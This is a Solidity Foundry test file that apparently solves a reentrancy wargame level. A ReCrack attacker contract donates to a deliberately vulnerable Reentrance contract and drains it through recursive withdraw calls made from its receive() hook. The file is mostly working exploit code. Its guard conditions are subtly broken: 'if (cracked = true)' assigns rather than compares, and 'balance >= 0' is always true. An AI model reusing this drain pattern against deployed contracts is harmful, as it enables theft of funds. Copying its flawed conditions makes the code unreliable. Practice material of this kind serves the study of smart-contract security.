pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {Reentrance} from "../src/10-reentrancy.sol";

contract Reentrancy10Test is Test {
    Reentrance reentr;
    ReCrack recrack;

    function setUp() public {
        emit log_string("🧪 Setup ReentranceTest...");
        reentr = new Reentrance();
        address bob = mkaddr("bob");
        vm.deal(bob, 100 ether);
        vm.startPrank(bob);
        reentr.donate.value(10 ether)(address(bob));
        emit log_named_uint("Balance of reentr is:", address(reentr).balance);
        vm.stopPrank();
    }

    function testEntran() public {
        emit log_string("🧪 Cracking Reentrance...");

        address alice = mkaddr("alice");
        vm.deal(alice, 100 ether);
        vm.startPrank(alice);
        recrack = new ReCrack(address(reentr));
        (bool success, ) = address(recrack).call.value(2 ether)("");
        emit log_named_uint("Balance of recrack is:", address(recrack).balance);

        recrack.donate(1 ether);

        recrack.withdrawRe();
        emit log_named_uint(
            "After withdraw, Balance of recrack is:",
            address(recrack).balance
        );
        recrack.withdraw();
        vm.stopPrank();
        emit log_named_uint("Balance of reentr is:", address(reentr).balance);
        emit log_named_uint("Alice balance is: ", address(alice).balance);
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }

    receive() external payable {}
}

contract ReCrack {
    address public addr;
    address public owner;
    bool public cracked;
    uint256 public drawamount;

    constructor(address _addr) public {
        addr = _addr;
        owner = msg.sender;
        cracked = false;
    }

    function donate(uint256 _num) public {
        IReentrance(addr).donate.value(_num)(address(this));
        cracked = true;
        drawamount = _num;
    }

    function withdrawRe() public payable {
        IReentrance(addr).withdraw.gas(40_000_000)(drawamount);
    }

    function withdraw() public {
        if (msg.sender == owner) {
            payable(owner).transfer(address(this).balance);
        }
    }

    receive() external payable {
        if (cracked = true) {
            if (address(addr).balance >= 0) {
                withdrawRe();
            }
        }
    }
}

interface IReentrance {
    function donate(address) external payable;

    function withdraw(uint256) external;

    function balance() external returns (uint256);
}
